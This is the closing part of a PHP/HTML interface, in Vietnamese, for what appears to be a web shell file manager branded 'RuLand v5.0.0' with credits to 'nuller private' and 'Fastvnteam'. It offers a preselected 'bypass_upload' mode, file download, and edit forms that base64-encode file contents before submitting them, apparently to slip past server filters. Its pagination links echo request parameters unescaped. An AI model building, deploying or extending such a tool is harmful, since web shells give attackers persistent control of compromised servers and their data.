                                    <a href="?path=<?=$path?>&search=<?=$search?>&page=<?=$page - 1?>" class="px-3 py-1.5 text-xs rounded-lg glass-effect text-green-400 hover:bg-green-500/10 transition-colors no-underline">← Trước</a>
                                <?php endif; ?>
                                
                                <?php for($i = 1; $i <= $totalPages; $i++): ?>
                                    <?php if($i == 1 || $i == $totalPages || ($i >= $page - 2 && $i <= $page + 2)): ?>
                                        <a href="?path=<?=$path?>&search=<?=$search?>&page=<?=$i?>" class="px-3 py-1.5 text-xs rounded-lg <?=$i == $page ? 'cyber-btn text-black' : 'glass-effect text-green-400 hover:bg-green-500/10'?> transition-colors no-underline"><?=$i?></a>
                                    <?php elseif($i == $page - 3 || $i == $page + 3): ?>
                                        <span class="px-2 py-1.5 text-xs text-green-400/30">...</span>
                                    <?php endif; ?>
                                <?php endfor; ?>
                                
                                <?php if($page < $totalPages): ?>
                                    <a href="?path=<?=$path?>&search=<?=$search?>&page=<?=$page + 1?>" class="px-3 py-1.5 text-xs rounded-lg glass-effect text-green-400 hover:bg-green-500/10 transition-colors no-underline">Sau →</a>
                                <?php endif; ?>
                            </div>
                        </div>
                        <?php endif; ?>
                        
                    <?php else: ?>
                        <div class="p-12 text-center">
                            <svg class="w-16 h-16 text-red-400/50 mx-auto mb-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z"/></svg>
                            <h3 class="text-lg font-semibold text-red-400 mb-2">Không Thể Truy Cập Thư Mục</h3>
                            <p class="text-green-400/60">Thư mục hiện tại không thể đọc được</p>
                        </div>
                    <?php endif; ?>
                </div>
                <?php } ?>
            </div>

            <!-- Footer -->
            <footer class="mt-auto border-t border-green-500/10 px-4 py-4">
                <div class="flex flex-col sm:flex-row items-center justify-between gap-2">
                    <div class="flex items-center gap-4 text-xs text-green-400/40">
                        <span class="font-semibold text-green-400/60">⚡ RuLand v5.0.0</span>
                        <span class="hidden sm:inline">•</span>
                        <span class="hidden sm:inline">Hệ Thống Quản Lý Tập Tin Tiên Tiến</span>
                    </div>
                    <div class="flex items-center gap-3 text-xs text-green-400/30">
                        <span>nuller private</span>
                        <span>•</span>
                        <span>Fastvnteam</span>
                    </div>
                </div>
            </footer>
        </main>
    </div>

    <!-- CheckAll JS -->
    <script>
        document.getElementById('checkAll')?.addEventListener('change', function(e) {
            const checkboxes = document.querySelectorAll('.file-checkbox');
            checkboxes.forEach(cb => cb.checked = e.target.checked);
        });
    </script>

    <!-- Upload Modal -->
    <div id="upload-modal" class="hidden fixed inset-0 z-[70] modal-overlay flex items-center justify-center p-4" onclick="if(event.target === this) this.classList.add('hidden')">
        <div class="glass-effect-strong rounded-2xl p-6 max-w-md w-full animate-fade-in">
            <div class="flex items-center justify-between mb-6">
                <div class="flex items-center gap-3">
                    <svg class="w-6 h-6 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 15v2a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3v-2M12 4v12m0 0-4-4m4 4 4-4"/></svg>
                    <h3 class="text-lg font-bold cyber-text-strong">Tải Tập Tin Lên</h3>
                </div>
                <button onclick="document.getElementById('upload-modal').classList.add('hidden')" class="text-green-400/60 hover:text-green-400 transition-colors">
                    <svg class="w-6 h-6" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18 18 6M6 6l12 12"/></svg>
                </button>
            </div>
            <form method="post" enctype="multipart/form-data">
                <div class="mb-4">
                    <label class="block mb-2 text-sm font-medium text-green-400">Chọn Tập Tin:</label>
                    <input type="file" name="nax" class="cyber-input block w-full p-4 text-sm rounded-xl file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-green-500/20 file:text-green-400 hover:file:bg-green-500/30" required>
                </div>
                <div class="mb-6">
                    <label class="block mb-2 text-sm font-medium text-green-400">Phương Thức Tải Lên:</label>
                    <select name="upmethod" class="cyber-select block w-full p-4 text-sm rounded-xl">
                        <option value="basic_upload">Tải Lên Cơ Bản</option>
                        <option value="bypass_upload" selected>Tải Lên Bypass</option>
                    </select>
                </div>
                <button class="cyber-btn w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="upload">
                    <span class="flex items-center justify-center gap-2">
                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 15v2a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3v-2M12 4v12m0 0-4-4m4 4 4-4"/></svg>
                        Tải Lên
                    </span>
                </button>
            </form>
        </div>
    </div>

    <!-- Search Modal -->
    <div id="search-modal" class="hidden fixed inset-0 z-[70] modal-overlay flex items-center justify-center p-4" onclick="if(event.target === this) this.classList.add('hidden')">
        <div class="glass-effect-strong rounded-2xl p-6 max-w-md w-full animate-fade-in">
            <div class="flex items-center justify-between mb-4">
                <h3 class="text-lg font-bold cyber-text-strong">Tìm Kiếm</h3>
                <button onclick="document.getElementById('search-modal').classList.add('hidden')" class="text-green-400/60 hover:text-green-400 transition-colors">
                    <svg class="w-6 h-6" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18 18 6M6 6l12 12"/></svg>
                </button>
            </div>
            <form method="get">
                <input type="hidden" name="path" value="<?=htmlspecialchars($path)?>">
                <div class="relative">
                    <svg class="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-green-400/60" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-width="2" d="m21 21-3.5-3.5M17 10a7 7 0 1 1-14 0 7 7 0 0 1 14 0Z"/></svg>
                    <input type="search" name="search" class="cyber-input block w-full p-4 pl-12 text-sm rounded-xl" placeholder="Tìm kiếm tập tin hoặc thư mục..." value="<?=htmlspecialchars($search)?>" autofocus>
                </div>
                <div class="flex gap-3 mt-4">
                    <button type="submit" class="cyber-btn flex-1 text-black font-bold rounded-lg text-sm px-4 py-2.5">Tìm Kiếm</button>
                    <button type="button" onclick="document.getElementById('search-modal').classList.add('hidden')" class="cyber-btn-outline flex-1 rounded-lg text-sm px-4 py-2.5">Đóng</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Sidebar Toggle
        function toggleSidebar() {
            const sidebar = document.getElementById('sidebar');
            const overlay = document.getElementById('sidebar-overlay');
            sidebar.classList.toggle('open');
            overlay.classList.toggle('open');
        }

        // Theme Toggle
        function toggleTheme() {
            document.documentElement.classList.toggle('dark');
            const isDark = document.documentElement.classList.contains('dark');
            localStorage.setItem('color-theme', isDark ? 'dark' : 'light');
        }

        // Download Helper
        function postDownload(filePath) {
            const form = document.createElement('form');
            form.method = 'post';
            form.style.display = 'none';
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'download';
            input.value = btoa(filePath);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        // Copy to Clipboard
        function copyToClipboard(elementId) {
            const textarea = document.getElementById(elementId);
            const text = textarea.value;
            navigator.clipboard.writeText(text).then(() => {
                const btn = event.target.closest('button');
                const originalHTML = btn.innerHTML;
                btn.innerHTML = '<svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm13.707-1.293a1 1 0 0 0-1.414-1.414L11 12.586l-1.793-1.793a1 1 0 0 0-1.414 1.414l2.5 2.5a1 1 0 0 0 1.414 0l4-4Z" clip-rule="evenodd"/></svg> Đã sao chép!';
                setTimeout(() => { btn.innerHTML = originalHTML; }, 2000);
            }).catch(() => {});
        }

        // File Edit Form Handler (Base64 encode before submit)
        const editForm = document.getElementById('handle_file');
        if (editForm) {
            editForm.addEventListener('submit', async (e) => {
                const filename = editForm.querySelector('[type="text"]');
                const textarea = editForm.querySelector('textarea');
                if (filename) filename.value = filename.value + ".temporary";
                if (textarea) {
                    textarea.value = await largeBase64Encode(textarea.value);
                }
            });
        }

        const editForm2 = document.getElementById('handle_file_edit');
        if (editForm2) {
            editForm2.addEventListener('submit', async (e) => {
                const filename = editForm2.querySelector('[type="text"]');
                const textarea = editForm2.querySelector('textarea');
                if (filename) filename.value = filename.value + ".temporary";
                if (textarea) {
                    textarea.value = await largeBase64Encode(textarea.value);
                }
            });
        }

        async function largeBase64Encode(str) {
            const utf8 = new TextEncoder().encode(str);
            let binary = '';
            const chunkSize = 0x8000;
            for (let i = 0; i < utf8.length; i += chunkSize) {
                const chunk = utf8.subarray(i, i + chunkSize);
                binary += String.fromCharCode.apply(null, chunk);
            }
            return btoa(binary);
        }

        // Auto-remove toasts after 5 seconds
        setTimeout(() => {
            document.querySelectorAll('.toast').forEach(t => t.remove());
        }, 5000);

        // Close modals on Escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal-overlay').forEach(m => m.classList.add('hidden'));
                if (document.getElementById('sidebar').classList.contains('open')) {
                    toggleSidebar();
                }
            }
        });
    </script>
</body>
</html>
